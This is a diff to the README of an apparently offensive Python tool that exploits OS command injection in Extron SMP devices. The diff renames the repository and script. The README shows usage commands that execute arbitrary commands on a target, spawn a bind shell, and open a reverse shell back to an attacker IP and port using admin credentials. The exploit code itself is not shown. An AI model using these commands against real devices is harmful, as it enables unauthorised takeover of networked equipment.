@@ -21,9 +21,9 @@ This tool exploits OS command injection vulnerabilities in Extron SMP devices. I
 To use this tool, you need Python 3.x and `pip` installed. Clone the repository and install the required packages:
 
 ```bash
-git clone https://github.com/yourusername/extron-smp-command-injection.git
-cd extron-smp-command-injection
-pip install requests
+git clone https://github.com/yourusername/extron-smp-inject.git
+cd extron-smp-inject
+pip install -r requirements.txt
 ```
 
 ## Usage
@@ -31,7 +31,7 @@ pip install requests
 To run the tool, use the following command:
 
 ```bash
-python main.py <action> [options]
+python extron_smp_inject.py <action> [options]
 ```
 
 ### Arguments
@@ -49,19 +49,19 @@ python main.py <action> [options]
 **Execute an arbitrary command:**
 
 ```bash
-python main.py command <target_ip> <target_port> --username admin --password <password> "ls -la"
+python extron_smp_inject.py command <target_ip> <target_port> --username admin --password <password> "ls -la"
 ```
 
 **Spawn a bind shell:**
 
 ```bash
-python main.py bind <target_ip> <target_port> <local_port> --username admin --password <password>
+python extron_smp_inject.py bind <target_ip> <target_port> <local_port> --username admin --password <password>
 ```
 
 **Spawn a reverse shell:**
 
 ```bash
-python main.py reverse <target_ip> <target_port> <attacker_ip> <attacker_port> --username admin --password <password>
+python extron_smp_inject.py reverse <target_ip> <target_port> <attacker_ip> <attacker_port> --username admin --password <password>
 ```
 
 ## Logging
